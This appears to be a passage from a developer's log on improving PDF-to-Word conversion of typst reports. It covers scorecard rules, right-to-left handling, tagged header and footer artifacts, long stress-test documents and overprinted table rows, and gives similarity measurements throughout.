`scorecard.py` never consulted `corpus.EXPECTED_FAILURES`, so it could not exit
0 while any document was listed; a listed document that misses the top rung now
prints `named: <reason>` instead of failing rule 1, and rules 2 to 6 still
apply to it. The first full run with both changes exits 0.

The last rung also stopped marking paragraphs. It added `w:bidi` and mirrored
the paragraph's indents and alignment, which is a move on the one rung that is
supposed to make none. The obvious middle, the mark without the mirroring,
scored rtl-arabic 0.7621, 0.0022 below raw, for the reason the mirroring
exists. With no paragraph mark on that rung rtl-arabic is at 0.7667 against
raw 0.7643 and rtl-mixed at 0.7905 against 0.7903; the rungs above still mark
and mirror. The corpus mean is 0.8352, down 0.0006, all of it rtl-arabic.

| document | mean full / raw | declined | verdict |
|---|---|---|---|
| rtl-arabic | 0.7667 / 0.7643 | align-rtl 3, rtl-reorder-plain-rung 3, rtl-respace 10 | named |
| rtl-mixed | 0.7905 / 0.7903 | align-rtl 1, rtl-reorder-plain-rung 6, rtl-respace 8 | named |

Every other row, the reference included (0.9152), is as in the table above.

#### Measured and reverted

- Declining alignment for every paragraph that holds text before its run's
  first line: ieee 0.6227 to 0.6238, but assessment 0.8690 to 0.8656, because a
  heading joined to the paragraph under it is the same shape and there the pass
  helps. Corpus 0.8358 to 0.8356.
- `rhythm-tall-row` without the condition that the converter already wrote the
  PDF's pitch: the reference 0.9152 to 0.9149.
- A bare `w:bidi` on right-to-left paragraphs without mirroring their indents
  and alignment: rtl-mixed 0.7906 to 0.7858, below raw.
- `w:rtl` on runs without the complex-script size and weight: rtl-in-shapes
  0.8797 to 0.8785.
- `w:bidi` without the mirrored indents and alignment on the last rung only:
  rtl-arabic 0.7621 against raw 0.7643, so that rung marks no paragraph.

### Fidelity, part ten: long reports, and the header typst already marked

Part nine's corpus is one to five pages a document. Then the owner filled the
CPTC template out to 57 pages, exported it, and Word laid it out as 83. Mean
page similarity 0.645, against 0.915 for the real 23-page report. Nothing in
the corpus could have shown it, because the failure needs length: the running
header and footer ended up in the page body, every page grew by the band's
height, and the overflow landed on pages that held nothing but a footer.
(The scorecard later showed how: the heuristic did find the bands, erasing
them lost text somewhere in 57 pages, and the ladder kept the file converted
with the bands left in, which is what the ladder is for.)

#### Six long documents first

Before touching the converter I built what I was missing. `stress.py` makes
six reports of neutral filler with a fixed seed: three from the owner's CPTC
template (57 pages, 26 pages and 119 pages; the short one cannot go lower
because the template's fixed sections are about 22 pages on their own), and
three grown from the corpus's findings, thesis and assessment templates, 31
to 54 pages. The prose is lorem ipsum, the commands are `echo` and `ls`, the
screenshots are bar charts it draws itself, and some regions are drawn
already pixelated. The template is the owner's and is never committed, so the
CPTC three are built only when `scorecard.py --stress` is given its folder
with `--cptc-template`.

Similarity alone would not have said what went wrong, so each row gained
three numbers that are reported, not ruled on: `blankPages` (Word pages whose
ink is only in the top or bottom 12%), `bandInBody` (whether any text of the
running header or footer is in the Word body) and `inkPastMargin` (Word pages
whose body ink passes the PDF's right content edge by more than 2 pt). The
full conversions run with the budget the server gives them, 105 s.

#### Typst had already said which rows are the header

The heuristic guesses the band from rows that repeat near the page edges and
erases a rectangle around them, and over enough pages one of those guesses
costs a line. But typst 0.14.2 writes tagged PDFs, and I had not looked: the
catalog says `MarkInfo /Marked true`, and the running header and footer are
wrapped in `/Artifact` marked content with `/Subtype /Header` and
`/Subtype /Footer`. The answer was in the file the whole time.

PyMuPDF cannot say which marked-content block a span came from, so
`tagged.py` does not try to join tags to spans. It removes every Header and
Footer artifact block from each page's content stream (nesting-aware, and it
refuses a stream whose marked content, `q`/`Q` or `BT`/`ET` do not balance,
because cutting there would change the graphics state for the rest of the
page), and the converter reads each page's rows before and after. The rows
that are gone are the band. They are matched back by text, top and left edge
(`TAGGED_X_TOLERANCE_PT`, 1 pt). The first version matched by text alone and
took whichever copy sat nearest the page edge, so a body line that read like
the band and sat near that edge would have gone with it. The rule and the strip a band draws are taken only from drawings that
went away with the artifacts.

The stripped copy is what pdf2docx converts on the repaired rung. That
replaces the rectangle erase for tagged bands, which round two of the review
already named: a rectangle is not the band, and what it erased beside the
band was gone without anyone seeing it.

The tags are trusted only as far as they are consistent. Every removed row
has to sit wholly above the page's first remaining body row or wholly below
its last, and a band whose text changes in place from page to page cannot be
one Word header; either failure, or any error while reading the tags, sends
the document to the heuristic exactly as before (`bands-tagged-inconsistent`,
`bands-tagged-varies`). Which path ran is counted, `bands-tagged` or
`bands-heuristic`, so a scorecard row says it. An untagged PDF never enters
the new path.

The final review found that consistent tags were not yet enough. A header
artifact on page three alone, beside a page number on every page, came out
as a header on all five Word pages, and the text check passed, because
nothing had been lost: it had been copied. A line marked as a header artifact
in the middle of page three's body left the body and went into all four
pages' headers the same way. And the corpus thesis, whose header starts on
page two and whose footer is on every page, gave Word's first page a header
the PDF's first page does not have, because the converter decided which pages
were bare from both bands together. So there is a coverage rule now: every
piece of a band has to be on every page of that band, and a band on one page
of a longer document is not a running band; either one sends the document to
the heuristic (`bands-tagged-partial`). With a Word section per PDF page the
header and the footer are each given only to their own pages, so the thesis's
first page gets its page number and no header. Without a section per page
Word cannot say that, and a header and footer on different pages are not
lifted (`bands-pages-apart`). Three smaller things from the same review:
`bands-tagged` is counted only once the bands survive the page-size check
(`bands-mixed-sizes` when they do not), a second stripped copy that cannot be
made or disagrees with the first keeps the bands in the body instead of
failing the export (`bands-tagged-restrip`), and an unreadable tag tree at
the contents gate falls back to the ordinary contents search.

Two smaller changes came out of the same reading. A tagged PDF gets a
contents page rebuilt only where its tag tree has a `/TOC`
(`toc-untagged` otherwise), because a dot-leader list with no TOC element
behind it is a price list. And `ensure_page_starts` checks that the Word file
has a page-starting section for every PDF page and, only if it does not,
puts a page break in front of each page's first line where it can find that
line uniquely (`page-start-unfound` where it cannot). It inserted nothing on
any document here: pdf2docx already wrote a section per page. I kept it
because a merged page is invisible in a similarity score until it happens.

#### Before and after

| document | PDF pages | Word pages before / after | mean before / after (raw) | blank pages | band in body | seconds |
|---|---|---|---|---|---|---|
| stress-cptc-57 | 57 | 83 / 57 | 0.6454 / 0.7759 (0.6502) | 26 / 0 | yes / no | 81.5 / 51.8 |
| stress-cptc-short | 26 | 26 / 26 | 0.8049 / 0.8049 (0.6952) | 0 / 0 | no / no | 26.8 / 22.8 |
| stress-cptc-long | 119 | 174 / 174 | 0.6444 / 0.6444 (0.6417) | 55 / 55 | yes / yes | 196.3 / 161.6 |
| stress-findings | 41 | 41 / 41 | 0.8853 / 0.8907 (0.8578) | 0 / 0 | no / no | 38.2 / 28.7 |
| stress-thesis | 54 | 57 / 57 | 0.6500 / 0.6500 (0.6498) | 1 / 1 | yes / yes | 107.4 / 80.5 |
| stress-assessment | 31 | 31 / 31 | 0.9093 / 0.9093 (0.9019) | 0 / 0 | yes / no (see below) | 59.8 / 55.6 |

The 57-page report is the one that mattered, and it is fixed in the way it
was broken: 57 Word pages for 57, no footer-only pages, the band in a Word
header, and 0.7759 where it was 0.6454, at the top rung with every line
present. It still breaks one rule, rule 4 on page 4, and I think the rule is
wrong there rather than the file: raw has 112 pages, its page 4 holds only a
footer, and a white page scores 0.6367 against the PDF's executive summary
while full's actual executive summary, with one line wrapped differently,
scores 0.6106. `inkPastMargin` is 14 on that report: justified lines Word sets
wider than the PDF. That was out of scope and is measured, not fixed.

One number in that table moved without the file moving. stress-assessment's
"band in body" went from yes to no, but the document mixes page sizes, so its
bands stay in the body on both runs. The before run used a stand-in for the
band's text (whatever sat in the top and bottom 8% of the page); the after run
reads the artifacts, which on that document hold only page numbers, and the
measurement ignores anything under four characters. So the "no" understates
it: the page numbers are in the body, and a band made only of a page number
is one the measurement cannot see.

The corpus and the reference kept the rule (exit 0). The reference takes the
tagged path and is unchanged to four places, 0.9152, 23 pages. findings rose
from 0.9204 to 0.9282. thesis fell from 0.8538 to 0.8502, still 0.08 over raw:
the heuristic had declined its running header, the tags lift it into a Word
header, and that costs each of its three pages a little similarity. I kept
it, because the header belongs in a header. Corpus mean 0.8352 to 0.8355.

#### What is still out

- **stress-cptc-long did not export as Word in the app.** (Since fixed: the converter now has no time limit unless `DOCX_CONVERT_TIMEOUT_S` sets one, and is stopped only when the browser disconnects.) It converted in
  161.6 s under the budget (196.3 s before), and the server kills the
  converter at 120 s, so on the server this 119-page report fails and the PDF
  is the way through. Its conversion also still falls back: the repaired rung
  loses three lines of its rebuilt contents page, so the kept file has the
  band in the body, 174 pages and 55 blank ones. The tags did not cause this
  and did not fix it. (Since fixed, and the diagnosis was wrong: the three
  lines were never the contents page's. See "The long report's lost lines
  were the PDF's" below.)
- **stress-thesis falls back for one line**, `Contents`, the heading of its
  contents page, which the contents rebuild loses when the bands are lifted.
  Skipping either repair keeps it, and the converter from before this round
  loses the same line on the same PDF, so it predates the tags. It is next on
  the list, because it is what keeps a tagged, correctly lifted header out of
  that file. Since the final review fixes it stops one step earlier: its
  header starts after its footer and pdf2docx did not write a section per
  page for it, so the bands are not lifted at all (`bands-pages-apart`).
  Same file, same 0.6500.
- **Tables from the tag tree** (`Table/TR/TD`) need tag ids joined to glyph
  positions, which PyMuPDF does not give. That is the next stage and its own
  design.
- **Justified lines past the margin and screenshots overlapping text** are
  now counted (`inkPastMargin`) and seen in the similarity, and not fixed.

Every run is in `corpus/SCORECARD.md`.

### Fidelity, part eleven: the long report's lost lines were the PDF's

The 119-page stress report kept falling back, and I had put that down to its
rebuilt contents page losing three lines. That was wrong, and the instrument
that said so was cheap: record the missing lines at every rung, and convert
the same PDF with `--raw`. Raw pdf2docx lost the same three lines. So did
every rung. No repair was deleting anything.

The three "lines" were 600 to 1,100 characters each: "Stale user accounts
27Missing patch baseline 28Inconsistent logging policy 29..." and on. They are
the report card, 50 findings in a table inside a `#figure`. Typst never splits
a figure across pages, so the 24 rows that do not fit page 11 are set on top
of one another at its foot, every one at y 735, and the compiler says nothing.
The PDF is unreadable there. pdf2docx, reading the same pile, keeps none of it,
and the ladder climbed down twice for text no rung could have: 269 s, and the
file kept had its header and footer in the body.

Two changes, one for the measurement and one for the converter:

- **`stress.py` lets the card break** once it has more than 26 rows
  (`#show figure: set block(breakable: true)`, scoped to the card), which is
  what an author would do. The 57-page and short reports have 19 and 3 rows,
  so their source is byte for byte what it was.
- **`convert.py` knows text the PDF overprints.** `overprinted_boxes` reads a
  page's spans and flags two that cover each other with different text. It
  works glyph by glyph, because PyMuPDF gives an Arabic span set one glyph at
  a time a box as wide as its whole line with the other spans inside it: the
  box test alone flagged 8 of rtl-arabic's 18 legible lines. Reading glyphs
  costs as much as reading the page again, so it is done only on a page where
  two span boxes already overlap; `body_lines` shares one `get_text("dict")`
  with `page_rows`, and on this report the whole thing runs in 4.6 s, under
  what `body_lines` cost before. Every body line now carries `page` and
  `overprinted`, `result.json` counts the missing ones
  (`textCheck.overprinted`), and the warning names the page and the fix.

The ladder then puts a rung back (`better_rung`) when every line it lost is
overprinted and the last rung lost those lines too. The first version was
broader, putting back any rung whose losses recurred below it, and the corpus
refused it: rtl-mixed's top rung came back at 0.7817 against 0.7906 for the
rung the ladder had kept and 0.7903 for raw. Losing the same legible lines on
every rung says nothing about which rung's layout is better, so that rule
went. The climb itself still runs, because I have no proof that pdf2docx
loses an overprinted line on every PDF; it costs time only on a PDF that is
already broken.

| PDF | rung kept | header and footer | missing | seconds |
|---|---|---|---|---|
| overprinted card, before | last | in the body | 3 | 269 |
| overprinted card, after | top | lifted, 117 pages | 3, named as page 11's | 250 |
| breakable card | top | lifted, 117 pages | 0 | 155 |

Through Word (`scorecard.py --stress`, 105 s budget as before), the breakable
card gives 120 Word pages for 120 PDF pages (174 before), 0 blank pages (55),
the band out of the body, and a mean of 0.7723 against raw 0.6400 (0.6444
before). It still breaks rule 4 on two pages: page 11 at 0.4943 against raw
0.5375 and page 18 at 0.8209 against 0.8528, the same kind of single-page
shortfall stress-cptc-57 has on its page 4. The corpus kept the rule.

BTCT's own starter report puts no table in a figure. A real report on the CPTC
template with more than 26 findings would have hit this in the PDF, before any
Word export; the export now says so.
